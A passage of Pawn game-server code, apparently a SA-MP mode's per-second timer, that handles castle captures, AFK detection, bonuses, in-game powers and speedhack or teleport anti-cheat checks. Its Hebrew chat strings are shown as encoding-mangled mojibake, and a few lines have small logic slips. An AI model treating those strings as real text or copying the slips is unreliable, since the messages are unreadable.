			{
			    cainfo[a][caStartCapture] = false;
			    cainfo[a][caCaptureTime] = MAX_CASTLE_CAPTURE_TIME;
				for(new cnew = 1; cnew < MAX_CLANS; cnew++) if(cainfo[a][caClans][cnew] > 4) counta[a][0] = cnew,counta[a][1]++;
   				GangZoneStopFlashForAll(cainfo[a][caGangZone]);
       			GangZoneHideForAll(cainfo[a][caGangZone]);
				if(counta[a][1] == 1)
				{
    				GangZoneShowForAll(cainfo[a][caGangZone],rgba2hex(claninfo[counta[a][0]][ccolor][0],claninfo[counta[a][0]][ccolor][1],claninfo[counta[a][0]][ccolor][2],250));
	                cainfo[a][caCapture] = counta[a][0], cainfo[a][caMissiles] = false, cainfo[a][caNewCapture] = MAX_CASTLE_TIME_NEW;
					format(string,sizeof(string)," !фЎьщч ь∙°ху сю∙ъ ∙·щщэ хчЎщ уўх· Єэ %d# ∙чўЁщэ хыс∙ р· фшщ°ф {%s}%s " @c(green) "фў°с Єь %s Ётю°, фўьря",cainfo[a][caClans][counta[a][0]],ClanHexColor(counta[a][0]),claninfo[counta[a][0]][cname],CastlesAreas[a][caName]);
					SendClientMessageToAll(green,string);
					cainfo[a][caCaptures]++, UpdateCastleText(a,true);
				}
				else if(counta[a][1] > 1)
				{
    				GangZoneShowForAll(cainfo[a][caGangZone],rgba2hex(CastlesAreas[a][caColorR],CastlesAreas[a][caColorG],CastlesAreas[a][caColorB],250));
					cainfo[a][caCapture] = -1, cainfo[a][caMissiles] = false, cainfo[a][caNewCapture] = MAX_CASTLE_TIME_NEW;
					format(string,sizeof(string)," !фў°с Єь %s Ётю°, " @c(red) "%s " @c(green) "ьр фЎьщч ь∙°ху сюфьъ ∙·щщэ хчЎщ уўх· Єэ чющ∙ф ∙чўЁщэ",CastlesAreas[a][caName],"рє ўьря");
					SendClientMessageToAll(green,string);
					for(new x = 0; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x)) GangZoneShowForPlayer(x,cainfo[a][caGangZone],rgba2hex(CastlesAreas[a][caColorR],CastlesAreas[a][caColorG],CastlesAreas[a][caColorB],250));
				}
				SendClientMessageToAll(grey," ( Х /Mode 91 -:ьющуЄ Ёхёє Єь юЄ°ы· фшщ°х· хфф∙·ьшхщх· ф∙·ю∙ сЇўхуф )");
                SetClanMaxBank(counta[a][0], claninfo[counta[a][0]][cmaxbank] + 7500, "ыщсх∙ шщ°ф");
				counta[a][0] = 0,counta[a][1] = 0;
			}
		}
		if(cainfo[a][caNewCapture] > 0)
		{
			cainfo[a][caNewCapture]--;
			if(!cainfo[a][caNewCapture])
			{
			    format(string,sizeof(string),"!Єс°х ∙ьх∙щэ уўх· юрц фў°с фрч°хя с%s ,ыЄ· ўьрЁщэ щыхьщэ ьсхр хьЁёх· ьысх∙ рх·ф",CastlesAreas[a][caName]);
			    BotSay(string,true);
			}
		}
	}
	new Float:bpp[3];
	// Players
	for(new i = 0, in = 0, wr = world_normal; i < MAX_PLAYERS_; i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
		    if(playerinfo[i][blockplayers])
		    {
		        for(new x; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && playerinfo[x][admin] < 20)
		    	{
		    	    GetPlayerPos(x, bpp[0], bpp[1], bpp[2]);
		    	    if(IsPlayerInRangeOfPoint(i, 10, bpp[0], bpp[1], bpp[2]))
		    	    {
		    	        AddPlayerVelocity(x,floatrand(-5.0,5.0),floatrand(-5.0,5.0),floatrand(0.1,5.0));
						new stadd[M_S], str[M_S];
				        switch(random(4))
				        {
				            case 0: format(stadd, M_S, " !ьр ьф·ў°с рьщщ");
				            case 1: format(stadd, M_S, " !ьъ ююЁщ");
				            case 2: format(stadd, M_S, " !Єхє ююЁщ");
				            case 3: format(stadd, M_S, " !··чЇє юыря");
				        }
						format(str, sizeof(str), ">> %s: "@c(lightred)"%s", GetName(i), stadd);
						SendClientMessage(x, GetPlayerColor(i), str);
				        format(str, sizeof(str), "[Block]: .Ёщёф ьф·ў°с рьщъ %s ф∙чўя", GetName(x));
				        SendClientMessage(i, red, str);
					}
		        }
		    }
		    // Reset Floods
			if(playerinfo[i][floodsecs] >= 1)
			{
				for(new ii=0;ii<3;ii++) playerinfo[i][flood][ii] = 0;
				playerinfo[i][floodsecs] = 0;
			}
			else playerinfo[i][floodsecs]++;
		  	#if aimbotcheck
		    // Aimbot Check
		    if(serverUptime % 20 == 0 || serverUptime % 20 == 1) playerinfo[i][awarns] = 0;
		    #endif
			// Kick Time
			if(playerinfo[i][kicktime] > 0)
			{
				playerinfo[i][kicktime]--;
				if(!playerinfo[i][kicktime]) SetKick(i,INVALID_PLAYER_ID,"",0);
				continue;
			}
			// Invites:
			if(serverUptime % 60 == 0) if(!playerinfo[i][invitetime][0]) playerinfo[i][invitetime][0] = MAX_INVITES;
			// Weapon Kills Update & Money Saving
			if(playerinfo[i][logged])
			{
				playerinfo[i][updatewkills]++;
				if(playerinfo[i][updatewkills] == 600)
				{
					playerinfo[i][updatewkills] = 0;
					for(new w = 0; w < 40; w++) if(playerinfo[i][wkillschange][w])
					{
						format(string,sizeof(string),"WKills%d",w);
						fsetint(fuser(i),string,playerinfo[i][wkills][w]);
					}
				}
				if(playerinfo[i][updatewkills] == 120) fsetint(fuser(i),"Kills",playerinfo[i][kills]);
				if(playerinfo[i][updatewkills] == 90)
				{
					for(new kp = KILL_TESTS-2; kp >= 0; kp--) playerinfo[i][lastkills][kp+1] = playerinfo[i][lastkills][kp];
					playerinfo[i][lastkills][0] = INVALID_PLAYER_ID;
				}
				if(playerinfo[i][savingmoney][0] > 0) playerinfo[i][savingmoney][0]--;
			}
			if(playerinfo[i][tricking][1] > 0) playerinfo[i][tricking][1]--;
			// Bot Security
			/*if(GetPlayerPing(i) == -1)
			{
				playerinfo[i][botwarns]++;
				if(playerinfo[i][botwarns] >= 3)
				{
					format(string,sizeof(string),"banip %s",GetIP(i));
					AdminInfo(i,string);
					SendRconCommand(string);
					SetKick(i,INVALID_PLAYER_ID,"",0);
				}
				continue;
			}*/
			in = GetPlayerInterior(i), wr = GetPlayerVirtualWorld(i);
			playerinfo[i][idletime]++;
			// Castles Checks
			if(playerinfo[i][castle] != -1 && playerinfo[i][pinv] == 0)
			{
				//if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK) SendClientMessage(i,red,".ьр Ёщ·я ьфщх· срцх° цф Єэ °ыс ·щў ёщьхя");
				if(IsPlayerInAnyVehicle(i))
				{
					SendClientMessage(i,red," .ьр Ёщ·я ьфщх· срцх° цф Єэ °ыс");
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
			}
			if(IsPlayerInAnyVehicle(i) && GetPlayerCheckpoint(i) == cp_vstore && !IsPlayerMAdmin(i) && playerinfo[i][cp] != -1)
			{
				if(IsPlayerInRangeOfPoint(i,20.0,cpinfo[playerinfo[i][cp]][cpx],cpinfo[playerinfo[i][cp]][cpy],cpinfo[playerinfo[i][cp]][cpz]))
				{
				    SendClientMessage(i,red," .ьр Ёщ·я ьфщх· срцх° цф Єэ °ыс");
				    SetVehicleToRespawn(GetPlayerVehicleID(i));
			    }
			}
			// Missions
			if(playerinfo[i][mstimenew] > 0) playerinfo[i][mstimenew]--;
            if(playerinfo[i][mission] != INVALID_MISSION_ID)
            {
                playerinfo[i][mstime]--;
                if(playerinfo[i][mstime] > 0 && !playerinfo[i][frozen])
                {
                    format(string,sizeof(string),"~g~Time Left: ~w~%d",playerinfo[i][mstime]);
                    PlayerTextDrawSetString(i,playerinfo[i][mtexts][1],string);
                    PlayerTextDrawShow(i,playerinfo[i][mtexts][1]);
                }
                if(playerinfo[i][frozen] && playerinfo[i][mstime] == 0)
                {
                    format(string,sizeof(string),"~b~Mission: ~w~%s",MissionsInfo[playerinfo[i][mission]][msTdName]);
					GameTextForPlayer(i, string, 1000, 4);
					CreateMissionTD(i,string);
                    SetCameraBehindPlayer(i);
                    SetFreeze(i,0),playerinfo[i][mstime] = 460;
                    for(new t = 0; t < 3; t++) PlayerTextDrawShow(i,playerinfo[i][mtexts][t]);
                    GenerateMissionPickup(i,playerinfo[i][mission]),playerinfo[i][mstatus] = 1;
                    /*SetPlayerVirtualWorld(i,world_normal);
                    SetVehicleVirtualWorld(playerinfo[i][mvehicle],world_normal);*/
                    PutPlayerInVehicle(i,playerinfo[i][mvehicle],0);
                }
                else if(!playerinfo[i][frozen] && playerinfo[i][mstime] == 0) KickMission(i,playerinfo[i][mission]);
            }
            // Boats DeathMatch
			if(playerinfo[i][dmzone] == dmz_boats)
			{
				GetVehicleHealth(GetPlayerVehicleID(i),h);
				SetPlayerArmour(i,floatround(h) / 10);
			}
			// Add TimeInServer
			if(!IsPlayerAFK_(i))
			{
				playerinfo[i][intime][0]++;
				if(playerinfo[i][intime][0] == 60) playerinfo[i][intime][0] = 0, playerinfo[i][intime][1]++;
			}
			// AFK
			GetPlayerPos(i,p[0],p[1],p[2]);
			if(!playerinfo[i][modeafk] && !playerinfo[i][frozen])
			{
				if(p[0] == playerinfo[i][startpos][0] && p[1] == playerinfo[i][startpos][1] && p[2] == playerinfo[i][startpos][2]) playerinfo[i][afk]++;
				else playerinfo[i][afk] = 0;
				if(playerinfo[i][afk] == 240)
				{
					playerinfo[i][afk] = 0;
					new reas[32];
					if(playerinfo[i][reqclass] && !playerinfo[i][logged] && fexist(fuser(i))) reas = "X";
					else if(playerinfo[i][inact]) reas = "ЇЄщьх·";
					else if(IsPlayerInArea(i,2598.4583, 1608.1553, 2436.0249,1481.9521) && !playerinfo[i][vip]) reas = "юЇўу· ысху";
					else if(playerinfo[i][inmarea] != -1) reas = "рцх° ыёє";
					if(!strlen(reas))
					{
						format(string,sizeof(string)," *** (фхЄс° рхшхюшщ·) AFK сюЎс %s",GetName(i));
						for(new a=0;a<MAX_PLAYERS_;a++) if(IsPlayerConnected(a) && playerinfo[a][setting][setting_showafk]) SendClientMessage(a,blue,string);
						SetFreeze(i,1);
						playerinfo[i][modeafk] = 1, playerinfo[i][canafk]--, playerinfo[i][usedafk] = 10;
						TextDrawShowForPlayer(i,unafktext);
						SetString(playerinfo[i][afkreason],"Escape");
						SetTimerEx("CanAFK",25000,0,"d",i);
					}
					else
					{
						if(reas[0] == 'X') SetKick(i,INVALID_PLAYER_ID,"цюя фф·чс°х· Єс°");
						else
						{
							format(reas,sizeof(reas),"с%s AFK",reas);
							SetKick(i,INVALID_PLAYER_ID,reas);
						}
						continue;
					}
				}
				for(new a = 0; a < 3; a++) playerinfo[i][startpos][a] = p[a];
			}
			if(playerinfo[i][usedafk] > 0) playerinfo[i][usedafk]--;
			if(playerinfo[i][idletime] > 20)
			{
				format(string,sizeof(string),"AFK: %02d:%02d:%02d",playerinfo[i][idletime]/3600,(playerinfo[i][idletime]/60)-((playerinfo[i][idletime]/3600)*60),playerinfo[i][idletime]%60);
				SetPlayerChatBubble(i,string,0xFF6A6AFF,50.0,1200);
				if(playerinfo[i][inact])
				{
					OutOfActivity(i);
					format(string,sizeof(string)," *** (сЇЄщьх· AFK) %s фхЎр юфЇЄщьх· Єь щущ %s",botname,GetName(i));
					for(new j=0;j<MAX_PLAYERS_;j++) if(IsPlayerConnected(j) && (playerinfo[j][setting][setting_showpunish] || i == j || IsPlayerMAdmin(j))) SendClientMessage(j,white,string);
				}
				if(headserver != INVALID_PLAYER_ID && headserver == i && playerinfo[i][idletime] > 120) StartHeadServer(3);
			}
			// Auto Music
			if(musictimer == 500 && autoplay && strlen(adminmusic) < 2)
			{
				PlayAudioStreamForPlayer(i,adminmusic);
				playerinfo[i][playingmusic] = 1;
			}
			// Hanukkah system
			#if hanukkah_now
			if(playerinfo[i][donuttime] && playerinfo[i][logged])
			{
			    playerinfo[i][donuttime]--;
			    if((playerinfo[i][donuttime] + 10) % 5 == 0) fsetint(fuser(i), "donut_time", playerinfo[i][donuttime]);
			}
			#endif
			// Time bonus
			if(playerinfo[i][intime][0] == 0 && playerinfo[i][intime][1] % 60 == 0 && playerinfo[i][intime][1] > 0 && playerinfo[i][logged] && !IsPlayerAFK_(i))
			{
				GiveMoney(i,200, 37);
				par = GetPlayerStatus(i) == status_none ? randomEx(-2,4) : -1;
				if(par < 0) if(par < 0) format(string,sizeof(string)," Х !200$ Єь ыъ ∙∙щчў· с∙°· ∙Єф ўщсь·",headserver != i ? 200 : 200*2);
				else
				{
					par = ChoosenWeapon(i,par), par2 = randomEx(3,11) * 100;
					GiveWeapon(i,par,par2);
					format(string,sizeof(string)," Х !Єэ %d ыух°щэ %s-Єь ыъ ∙∙щчў· с∙°· ∙Єф ўщсь· 200$ х",par2,WeaponName(par));
				}
				if(playerinfo[i][intime][1] == 3) ObjectiveComplete(i,objective_playingtime1);
				if(playerinfo[i][intime][1] == 6) ObjectiveComplete(i,objective_playingtime2);
				SendClientMessage(i,orange,string);
			}
			else if(playerinfo[i][intime][0] == 0 && playerinfo[i][intime][1] == 30 && playerinfo[i][intime][1] > 0 && playerinfo[i][logged] && !IsPlayerAFK_(i))
			{
				GiveMoney(i,75, 37);
				SendClientMessage(i,orange," Х !Єь ыъ ∙∙щчў· с∙°· чЎщ ∙Єф ўщсь· 75$");
			}
			// Phone mone
			if((playerinfo[i][publicphone] > 0 || playerinfo[i][phone] <= 1) && playerinfo[i][calling] != -1 && playerinfo[i][canswer] && playerinfo[i][callid])
			{
				if(GetMoney(i) >= 1)
				{
					playerinfo[i][callcash]++;
					if(playerinfo[i][callcash] == 15) GiveMoney(i,0-1, -1);
				}
				else
				{
					SendClientMessage(i,red," .рщя ьъ юёЇщў ыёє сыущ ь∙ьэ Єь ф∙щчф фцх щх·°: ф∙щчф Ёх·ўф");
					SendClientMessage(playerinfo[i][calling],red," .ь∙чўя рщ·х ущс°· сЇьрЇхя Ётю° фыёє: ф∙щчф Ёх·ўф");
					PlayerStopUseCellPhone(i);
					PlayerStopUseCellPhone(playerinfo[i][calling]);
					playerinfo[playerinfo[i][calling]][calling] = -1;
					playerinfo[playerinfo[i][calling]][canswer] = 0;
					playerinfo[playerinfo[i][calling]][caller] = 0;
					playerinfo[playerinfo[i][calling]][callcash] = 0;
					playerinfo[i][calling] = -1;
					playerinfo[i][canswer] = 0;
					playerinfo[i][callid] = 0;
					playerinfo[i][caller] = 0;
					playerinfo[i][callcash] = 0;
					if(playerinfo[i][publicphone] > 0)
					{
						cpinfo[playerinfo[i][publicphone]][cpused] = INVALID_PLAYER_ID;
						playerinfo[i][publicphone] = 0;
					}
					else if(playerinfo[playerinfo[i][calling]][publicphone] > 0)
					{
						cpinfo[playerinfo[playerinfo[i][calling]][publicphone]][cpused] = INVALID_PLAYER_ID;
						playerinfo[playerinfo[i][calling]][publicphone] = 0;
					}
				}
			}
	 		// Money Areas health & armour & cash
	 		if(!wr && GetPlayerState(i) == PLAYER_STATE_ONFOOT && playerinfo[i][dmzone] == dmz_none && playerinfo[i][tdmzone] == tdmz_none && GetPlayerVirtualWorld(i) == world_normal && GetPlayerInterior(i) == 0 && !playerinfo[i][reqclass] && !IsPlayerAFK_(i) && playerinfo[i][inmarea] != -1)
			{
				if(playerinfo[i][pet][2] == 1)
				{
					if(playerinfo[i][pet][3]) StopPetAttacking(i);
					DestroyObject(playerinfo[i][pet][1]);
					playerinfo[i][pet][2] = 0;
					playerinfo[i][pet][3] = 0;
					SendClientMessage(i,red," .ьр Ёщ·я ь∙т° чщф ьрцх° цф");
				}
				GetPlayerHealth(i,h);
				SetPlayerHealth(i,h < 100.0 ? h + 1.0 : 100.0);
				if(h >= 100.0)
				{
					GetPlayerArmour(i,h);
					SetPlayerArmour(i,h < 100.0 ? h + 1.0 : 100.0);
				}
			    if(random(12) == 4) Log("Money", i, "collecting money from money area...");
				GiveMoney(i,moneyar[random(sizeof(moneyar))] + playerinfo[i][vip]);
			}
			// Auto Healing
			if(playerinfo[i][scroll] == scroll_autohealing && playerinfo[i][scrollusing]) if(CanUseScroll(i))
			{
				GetPlayerHealth(i,h);
				SetPlayerHealth(i,h < 100.0 ? h + 1.0 : 100.0);
				if(h >= 100.0)
				{
					GetPlayerArmour(i,h);
					SetPlayerArmour(i,h < 100.0 ? h + 1.0 : 100.0);
				}
			}
			// GodMod
			if(playerinfo[i][gm])
			{
				SetPlayerHealth(i,100000.0);
				if(IsPlayerInAnyVehicle(i))
				{
					RepairVehicle(GetPlayerVehicleID(i));
					SetVehicleHealth(GetPlayerVehicleID(i),10000.0);
					vehicleinfo[GetPlayerVehicleID(i)][vgm] = 1;
				}
			}
			// Atom bomb
			if(playerinfo[i][bomb] == 6 && ++playerinfo[i][bombtime] % 5 == 0 && !(playerinfo[i][bombpos][0] == 0.0 || playerinfo[i][bombpos][1] == 0.0 || playerinfo[i][bombpos][2] == 0.0)) for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii)) if(IsPlayerInCircle(ii,playerinfo[i][bombpos][0],playerinfo[i][bombpos][1],100.0)) SendClientMessage(ii,red," !р·ф Єхюу сюўхэ сх Єхюу· ьЁчх· ЇЎЎ· ршхэ: ьсшчхЁъ фрщ∙щ, с°ч");
			// Hydrogen bomb
			if(playerinfo[i][bomb] == 7 && ++playerinfo[i][bombtime] % 5 == 0 && !(playerinfo[i][bombpos][0] == 0.0 || playerinfo[i][bombpos][1] == 0.0 || playerinfo[i][bombpos][2] == 0.0)) for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii)) if(IsPlayerInCircle(ii,playerinfo[i][bombpos][0],playerinfo[i][bombpos][1],100.0)) SendClientMessage(ii,red," !р·ф Єхюу сюўхэ сх Єхюу· ьЁчх· ЇЎЎ· ющюя: ьсшчхЁъ фрщ∙щ, с°ч");
			// Crane
			if(playerinfo[i][incrane]) if(--playerinfo[i][cranetime] <= 0)
			{
				SetVehicleHealth(GetPlayerVehicleID(i),0.0);
				SetPlayerHealth(i,0.0);
				playerinfo[i][incrane] = 0, playerinfo[i][cranetime] = 0;
				SendClientMessage(i,red," .цюЁъ сюЁхє ·э");
				News(" /Crane !фюЁхє ЇЁхщ");
			}
			// Quit Army
			if(playerinfo[i][inarea51]) if(GetPlayerDistanceToPoint(i,315.9212,984.5837) > 75.0)
			{
				playerinfo[i][inarea51] = 0;
				DisablePlayerCheckpoint(i);
				LoadPlayerWeapons(i);
				SendClientMessage(i,green," .Army щЎр· ю");
			}
			// Quit Plane
			if(playerinfo[i][inplane]) if(GetPlayerDistanceToPoint(i,1.5627,23.1112) > 75.0)
			{
				playerinfo[i][inplane] = 0;
				DisablePlayerCheckpoint(i);
				LoadPlayerWeapons(i);
			}
			// Quit Shooting
			if(playerinfo[i][inshooting] != -1)
			{
				if(z[0] < Shooting[playerinfo[i][inshooting]][2] - 7.5 && !PlayerHasWeapon(i,46))
				{
					playerinfo[i][inshooting] = -1;
					DisablePlayerCheckpoint(i);
					LoadPlayerWeapons(i);
					SpawnPlayer(i);
					SendClientMessage(i,red," .Shooting фЇёу· с");
					SetPlayerVirtualWorld(i,world_normal);
				}
				if(GetPlayerDistanceToPoint(i,Shooting[playerinfo[i][inshooting]][0],Shooting[playerinfo[i][inshooting]][1]) > 500.0 || !PlayerHasWeapon(i,46))
				{
					playerinfo[i][inshooting] = -1;
					DisablePlayerCheckpoint(i);
					LoadPlayerWeapons(i);
					SendClientMessage(i,green," .Shooting щЎр· ю");
					SetPlayerVirtualWorld(i,world_normal);
				}
			}
			// Quit Stunting
			if(playerinfo[i][instunting] != -1)
			{
				if(GetPlayerState(i) != PLAYER_STATE_DRIVER)
				{
					playerinfo[i][instunting] = -1;
					DisablePlayerCheckpoint(i);
					LoadPlayerWeapons(i);
					SpawnPlayer(i);
					SendClientMessage(i,red," .Stunting фЇёу· с");
					SetPlayerVirtualWorld(i,world_normal);
					DisablePlayerRaceCheckpoint(i);
				}
				if(GetPlayerDistanceToPoint(i,Stunting[playerinfo[i][instunting]][stSpawn][0],Stunting[playerinfo[i][instunting]][stSpawn][1]) > 500.0)
				{
					playerinfo[i][instunting] = -1;
					DisablePlayerCheckpoint(i);
					LoadPlayerWeapons(i);
					SendClientMessage(i,green," .Stunting щЎр· ю");
					SetPlayerVirtualWorld(i,world_normal);
					DisablePlayerRaceCheckpoint(i);
				}
			}
			// Teleporting
			if((GetPlayerCheckpoint(i) == cp_bank || GetPlayerCheckpoint(i) == cp_ammu) && GetPlayerInterior(i) > 0 && IsPlayerInAnyVehicle(i) && !IsPlayerMAdmin(i) && !playerinfo[i][dontac])
			{
				Cheat(i,"Interior Teleporting",1);
				continue;
			}
			// Raise Cost
			if(playerinfo[i][raise] != INVALID_PLAYER_ID)
			{
				if(playerinfo[i][upgradecmd][lcmdid("/raise",1)] == 1) GiveMoney(i,0-2, -1);
				else if(playerinfo[i][upgradecmd][lcmdid("/raise",1)] == 2) GiveMoney(i,0-1, -1);
				//else if(playerinfo[i][upgradecmd][lcmdid("/raise",1)] == 3) GiveMoney(i,0-1, -1);
				if(GetMoney(i) <= 0 || GetPlayerSpecialAction(i) != SPECIAL_ACTION_USEJETPACK) StopRaise(i);
			}
			// Charge Ultimate Power
			if(!in && !wr && playerinfo[i][upower] != -1 && playerinfo[i][charge] > -1 && playerinfo[i][charge]/2 <= GetUltimatePowerMaxLevel(playerinfo[i][upower]) && GetPlayerState(i) == PLAYER_STATE_ONFOOT)
			{
				playerinfo[i][charge]++;
				valstr(string,playerinfo[i][charge]);
				UpdatePlayerUPChargeTD(i,playerinfo[i][upower],playerinfo[i][charge]);
			}
			// Charge Second Ultimate Power
			if(!in && !wr && playerinfo[i][upower2] != -1 && playerinfo[i][charge2] > -1 && playerinfo[i][charge]/2 <= GetUltimatePowerMaxLevel(playerinfo[i][upower2]) && GetPlayerState(i) == PLAYER_STATE_ONFOOT)
			{
				playerinfo[i][charge2]++;
				valstr(string,playerinfo[i][charge2]);
				UpdatePlayerUPChargeTD(i,playerinfo[i][upower2],playerinfo[i][charge2]);
			}
			// Quickly Defence
			if(playerinfo[i][quicklydefence] > 0) playerinfo[i][quicklydefence]--;
			// Tornado
			if(playerinfo[i][tornado] > 0)
			{
				playerinfo[i][tornado]--;
				for(new ii = 0; ii < MAX_PLAYERS_; ii++) if(IsPlayerConnected(ii) && i != ii && IsPlayerStreamedIn(i,ii))
				{
					GetPlayerPos(ii,op[0],op[1],op[2]);
					if(op[0] >= playerinfo[i][torpos][0] - 35.0 && op[0] <= playerinfo[i][torpos][0] + 35.0 &&
					op[1] >= playerinfo[i][torpos][1] - 35.0 && op[1] <= playerinfo[i][torpos][1] + 35.0 &&
					op[2] >= playerinfo[i][torpos][2] - 35.0 && op[2] <= playerinfo[i][torpos][2] + 35.0) AddPlayerVelocity(ii,floatrand(-5.0,5.0),floatrand(-5.0,5.0),floatrand(0.1,5.0));
				}
			}
			// Thunderstorm
			if(playerinfo[i][storm] > 0)
			{
				playerinfo[i][storm]--;
				for(new ii = 0; ii < MAX_PLAYERS_; ii++) if(IsPlayerConnected(ii) && i != ii && IsPlayerStreamedIn(i,ii) && !playerinfo[i][lredirection]) if(!random(3))
				{
					GetPlayerPos(ii,op[0],op[1],op[2]);
					if(op[0] >= playerinfo[i][storpos][0] - 35.0 && op[0] <= playerinfo[i][storpos][0] + 35.0 &&
					op[1] >= playerinfo[i][storpos][1] - 35.0 && op[1] <= playerinfo[i][storpos][1] + 35.0 &&
					op[2] >= playerinfo[i][storpos][2] - 35.0 && op[2] <= playerinfo[i][storpos][2] + 35.0) CreateExplosionVW(op[0],op[1],op[2],!random(2) ? 7 : 6,!random(2) ? 0.3 : 0.1,0);
				}
			}
			// Erase Circle
			if(playerinfo[i][erase] > 0)
			{
				playerinfo[i][erase]--;
				for(new ii = 0; ii < MAX_PLAYERS_; ii++) if(IsPlayerConnected(ii) && i != ii && IsPlayerStreamedIn(i,ii) && IsPlayerInSphere(ii,playerinfo[i][erapos][0],playerinfo[i][erapos][1],playerinfo[i][erapos][2],40.0) && !playerinfo[ii][erasehurt])
				{
					playerinfo[ii][erasehurt] = 1;
					for(new t = 1; t <= 3; t++) SetTimerEx("EraseCircleEffect",1500*t,0,"iii",i,ii,t);
				}
			}
			// Clan Earth Energy
			if(playerinfo[i][clan] > 0 && claninfo[playerinfo[i][clan]][cendpower][1] != -1) if(GetPlayerHQ(i) == playerinfo[i][clan])
			{
				if(equal(cupowers[claninfo[playerinfo[i][clan]][cendpower][1]][CUPName],"Earth Energy"))
				{
					GetPlayerHealth(i,h);
					if(h < 100.0) SetPlayerHealth(i,h + 5.0 > 100.0 ? 100.0 : h + 5);
				}
				else if(equal(cupowers[claninfo[playerinfo[i][clan]][cendpower][1]][CUPName],"Infinite Health")) SetPlayerHealth(i,claninfo[playerinfo[i][clan]][cendpower][0] <= 1 ? 100.0 : 100000.0);
			}
			// Car Jump
			if(playerinfo[i][cancarjump] > 0) playerinfo[i][cancarjump]--;
			// Reset Copy Power
			if(playerinfo[i][copypower][2] > 0) playerinfo[i][copypower][2]--;
			// Fast Killing
			if(playerinfo[i][fastkilling][0] > 0) playerinfo[i][fastkilling][0]--;
			if(playerinfo[i][fastkilling][1] > 0 && !playerinfo[i][fastkilling][0]) playerinfo[i][fastkilling][1] = 0;
			// Battle Update
			if(playerinfo[i][inbattle]) playerinfo[i][btime]++;
			if(battleDialogDelay > 0) if(!battleDialogDelay) battleDialog = ""; else battleDialogDelay--;
			// Ping Test
			if(playerinfo[i][pingtest][0] && playerinfo[i][pingtest][2] > 0)
			{
				if(playerinfo[i][pingtest][1] >= MAX_PINGTEST-1 || playerinfo[i][pingtest][1] >= playerinfo[i][pingtest][2]) EndPingTest(i);
				if(playerinfo[i][pingtest][0]) playerinfo[i][ppings][playerinfo[i][pingtest][1]++] = GetPlayerPing(i);
			}
			// Bot CD
			if(botcd > 0) botcd--;
			// Player Options
			if(optioneds > 0) for(new ii = 0, s = optioned[0]; ii < optioneds; ii++, s = optioned[ii]) if(IsPlayerConnected(s) && s != INVALID_PLAYER_ID) switch(playerinfo[s][poption])
			{
				case po_cantlook: if(IsPlayerLookingAtPlayer(i,s,3.0) && GetDistanceBetweenPlayers(i,s) <= 40.0 && i != s)
				{
					format(string,sizeof(string)," !%s рёх° ьфё·ыь Єь",GetName(s));
					SendClientMessage(i,red,string);
				}
				case po_pee: if(i != s)
				{
					if(GetPlayerSpecialAction(s) == 68)
					{
						GetPlayerPos(s,p[0],p[1],p[2]);
						if(IsPlayerInRangeOfPoint(i,2.5,p[0],p[1],p[2]))
						{
							SendClientMessage(i,red," !ЁЇтЄ· юф∙·Ё· фюхх·");
							GetPlayerPos(i,p[0],p[1],p[2]);
							CreateExplosion(p[0],p[1],p[2],12,0.1);
							playerinfo[i][dontac] = 5;
						}
					}
					else RemovePlayerOption(s);
				}
			}
			// Speed Test
			//if(IsPlayerInAnyVehicle(i)) GetVehicleVelocity(GetPlayerVehicleID(i),playerinfo[i][speedtest][0],playerinfo[i][speedtest][1],playerinfo[i][speedtest][2]);
			//else GetPlayerVelocity(i,playerinfo[i][speedtest][0],playerinfo[i][speedtest][1],playerinfo[i][speedtest][2]);
			if(!IsPlayerAFK_(i))
			{
				if(!playerinfo[i][usetele])
				{
					playerinfo[i][pspeed] = GetPlayerDistanceToPointEx(i,playerinfo[i][speedtest][0],playerinfo[i][speedtest][1],playerinfo[i][speedtest][2]);//ConvertVelocityToKMH(playerinfo[i][speedtest][0],playerinfo[i][speedtest][1],playerinfo[i][speedtest][2]);
					playerinfo[i][pkmh] = floatround(floatround(playerinfo[i][pspeed] * 3000)/1000);
				}
				else playerinfo[i][usetele] = 0;
				if(playerinfo[i][dontac] > 0) playerinfo[i][dontac]--;
				else
				{
					if(playerinfo[i][pkmh] > 400 && (GetPlayerState(i) == PLAYER_STATE_ONFOOT || GetPlayerState(i) == PLAYER_STATE_DRIVER) && !playerinfo[i][mapt] && GetPlayerSurfingVehicleID(i) == INVALID_VEHICLE_ID && !IsPlayerInRangeOfPoint(i,15.0,0.0,0.0,0.0))
					{
						if(IsPlayerInAnyVehicle(i))
						{
							par = GetPlayerVehicleID(i);
							if(GetVehicleType(par) == 4) continue;
						}
						par = GetPlayerTeleportArea(i);
						if(playerinfo[i][playerprize] != 1 && (par == -1 || (par != -1 && !Teleports[par][TAC])))
						{
							//playerinfo[i][speedwarns]++;
							AdminInfo(i,playerinfo[i][pkmh] <= 600.0 ? ("Speedhack/Airbreak?") : ("Teleporting?"));
							if(playerinfo[i][speedwarns] >= 5)
							{
								Cheat(i,playerinfo[i][pkmh] <= 600.0 ? ("Speed") : ("Teleporting"),1);
								continue;
							}
						}
					}
				}
				for(new j = 0; j < 3; j++) playerinfo[i][speedtest][j] = p[j];
			}
			// Death Delay
			if(playerinfo[i][deathdelay] > 0) playerinfo[i][deathdelay]--;
			// Spawn Money Delay
			//if(playerinfo[i][spawnmoneydelay] > 0) playerinfo[i][spawnmoneydelay]--;
			// Anti Ping
			if(playerinfo[i][spawned] && GetPlayerPing(i) >= max_ping && playerinfo[i][intime][1] > 0)
			{
				SetKick(i,MAX_PLAYERS+1,"ЇщЁт тсхф");
				continue;
			}
			// Army Rockets
			if(!in && !wr && !playerinfo[i][vip])
			{
			    if(playerinfo[i][rocketsent] > 0) playerinfo[i][rocketsent]--;
				for(new ar = 0; ar < sizeof(ArmyRockets); ar++) if(IsPlayerInRangeOfPoint(i,75.0,ArmyRockets[ar][0],ArmyRockets[ar][1],ArmyRockets[ar][2]))
				{
					if(!playerinfo[i][rocketsent])
					{
						SendObject(354,ArmyRockets[ar][0],ArmyRockets[ar][1],ArmyRockets[ar][2],p[0],p[1],p[2],25.0,6);
						Streamer_Update(i);
						playerinfo[i][rocketsent] = 5;
					}
					if(playerinfo[i][rocketsent] > 0) PlaySound(i,1057);
				}
			}
